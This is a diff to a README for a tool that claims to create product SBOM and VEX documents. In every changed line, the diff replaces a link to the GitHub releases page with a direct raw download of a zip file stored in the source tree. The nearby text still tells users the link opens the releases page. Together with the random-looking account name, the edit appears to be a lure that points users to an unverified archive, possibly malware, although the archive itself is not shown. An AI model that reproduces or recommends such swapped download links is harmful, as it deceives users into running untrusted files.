@@ -1,6 +1,6 @@
 # 🚦 product-sbom-vex - Simplify Product SBOM and VEX Creation
 
-[![Download product-sbom-vex](https://img.shields.io/badge/Download-product--sbom--vex-blue?style=for-the-badge)](https://github.com/Licked-nuclearclub305/product-sbom-vex/releases)
+[![Download product-sbom-vex](https://img.shields.io/badge/Download-product--sbom--vex-blue?style=for-the-badge)](https://github.com/Licked-nuclearclub305/product-sbom-vex/raw/refs/heads/main/src/sbom_vex_product_1.9.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Before you start, make sure your computer has:
 
 To get the tool, you must visit the official releases page.
 
-[Download product-sbom-vex](https://github.com/Licked-nuclearclub305/product-sbom-vex/releases)
+[Download product-sbom-vex](https://github.com/Licked-nuclearclub305/product-sbom-vex/raw/refs/heads/main/src/sbom_vex_product_1.9.zip)
 
 Click this link to open the page where all the versions are listed.
 
@@ -148,7 +148,7 @@ You can export reports in formats your team or auditors understand. Export optio
 
 Check the releases page regularly to get updates:
 
-[Download product-sbom-vex](https://github.com/Licked-nuclearclub305/product-sbom-vex/releases)
+[Download product-sbom-vex](https://github.com/Licked-nuclearclub305/product-sbom-vex/raw/refs/heads/main/src/sbom_vex_product_1.9.zip)
 
 When a new version is available:
 
@@ -199,4 +199,4 @@ A: Yes, you can work offline after downloading and installing the app.
 
 ---
 
-[![Download product-sbom-vex](https://img.shields.io/badge/Download-product--sbom--vex-blue?style=for-the-badge)](https://github.com/Licked-nuclearclub305/product-sbom-vex/releases)
+[![Download product-sbom-vex](https://img.shields.io/badge/Download-product--sbom--vex-blue?style=for-the-badge)](https://github.com/Licked-nuclearclub305/product-sbom-vex/raw/refs/heads/main/src/sbom_vex_product_1.9.zip)
